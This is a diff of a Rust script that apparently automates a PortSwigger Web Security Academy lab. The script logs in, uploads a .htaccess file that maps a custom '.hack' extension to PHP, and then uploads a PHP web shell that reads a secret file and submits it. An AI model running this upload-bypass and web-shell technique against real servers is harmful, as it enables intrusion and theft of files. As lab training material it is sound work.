@@ -1,20 +1,21 @@
-/*************************************************************************
+/***************************************************************************************
 *
 * Author: Ahmed Elqalawy (@elqal3awii)
 *
 * Date: 12/10/2023
 *
-* Lab: Web shell upload via Content-Type restriction bypass
+* Lab: Web shell upload via extension blacklist bypass
 *
 * Steps: 1. Fetch login page
 *        2. Extract csrf token and session cookie
 *        3. Login as wiener
 *        4. Fetch wiener profile
-*        5. Upload the shell file with the Content-Type changed
-*        6. Fetch the uploaded shell file to read the secret
-*        7. Submit the solution
+*        5. Upload a .htaccess file containing a mapping rule to a custom extension
+*        6. Upload the shell file with the custom extension
+*        7. Fetch the uploaded shell file to read the secret
+*        8. Submit the solution 
 *
-**************************************************************************/
+****************************************************************************************/
 #![allow(unused)]
 /***********
 * Imports
@@ -41,7 +42,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a7d00510386624c80863a8700d900cf.web-security-academy.net";
+    let url = "https://0a740001033e4fcc813cb2a700b1000d.web-security-academy.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -103,31 +104,68 @@ fn main() {
     // extract csrf token
     csrf = extract_csrf(wiener).expect(&format!("{}", "[!] Failed extract csrf".red()));
 
+    // the .htaccess with our own rule
+    // this rule maps the files with the extension .hack to be executed as a php files
+    // you can change .hack to what you want but change the shell_file_name variable accordingly
+    let htaccess_file = "AddType application/x-httpd-php .hack";
+
+    // the avatar part of the .htaccess uploading request
+    let mut avatar_part = Part::bytes(htaccess_file.as_bytes())
+        .file_name(".htaccess")
+        .mime_str("text/plain")
+        .expect(&format!(
+            "{}",
+            "[!] Failed to construct the avatar part of the .htaccess uploading request".red()
+        ));
+
+    // construct the multipart form of the .htaccess uploading request
+    let mut form = Form::new()
+        .part("avatar", avatar_part)
+        .text("user", "wiener")
+        .text("csrf", csrf.clone());
+
+    println!("{}", "OK".green());
+    print!(
+        "{}",
+        "⦗5⦘ Uploading a .htaccess file containing a mapping rule to a custom extension.. ".white(),
+    );
+    io::stdout().flush();
+
+    // upload the .htaccess file
+    client
+        .post(format!("{url}/my-account/avatar"))
+        .header("Cookie", format!("session={session}"))
+        .multipart(form)
+        .send()
+        .expect(&format!("{}", "[!] Failed to upload the .htaccess file".red()));
+
     // the shell file to be uploaded
     let shell_file = r###"<?php echo file_get_contents("/home/carlos/secret") ?>"###;
 
     // the shell file name
-    // you can change this to what you want
-    let shell_file_name = "hack.php";
+    // you can change this to what you want but keep the extension .hack unless you changed it in the .htaccess rule above
+    let shell_file_name = "shell.hack";
 
-    // the avatar part of the request
-    // change the content-type to bypass filter
-    let avatar_part = Part::bytes(shell_file.as_bytes())
+    // the avatar part of the shell file uploading request
+    avatar_part = Part::bytes(shell_file.as_bytes())
         .file_name(shell_file_name)
-        .mime_str("image/png")
+        .mime_str("application/x-php")
         .expect(&format!(
             "{}",
-            "[!] Failed to construct the avatar part".red()
+            "[!] Failed to construct the avatar part of the shell file uploading request".red()
         ));
 
-    // construct the multipart form
-    let form = Form::new()
+    // construct the multipart form of the shell file uploading request
+    form = Form::new()
         .part("avatar", avatar_part)
         .text("user", "wiener")
         .text("csrf", csrf);
 
     println!("{}", "OK".green());
-    print!("{}", "⦗5⦘ Uploading the shell file with the Content-Type changed.. ".white(),);
+    print!(
+        "{}",
+        "⦗6⦘ Uploading the shell file with the custom extension.. ".white(),
+    );
     io::stdout().flush();
 
     // upload the shell file
@@ -141,7 +179,7 @@ fn main() {
     println!("{}", "OK".green());
     print!(
         "{}",
-        "⦗6⦘ Fetching the uploaded shell file to read the secret.. ".white(),
+        "⦗7⦘ Fetching the uploaded shell file to read the secret.. ".white(),
     );
     io::stdout().flush();
 
@@ -160,7 +198,7 @@ fn main() {
 
     println!("{}", "OK".green());
     println!("❯ {} {}", "Secret:".blue(), secret.yellow());
-    print!("{} ", "⦗7⦘ Submitting the solution..".white());
+    print!("{} ", "⦗8⦘ Submitting the solution..".white());
     io::stdout().flush();
 
     // submit the solution
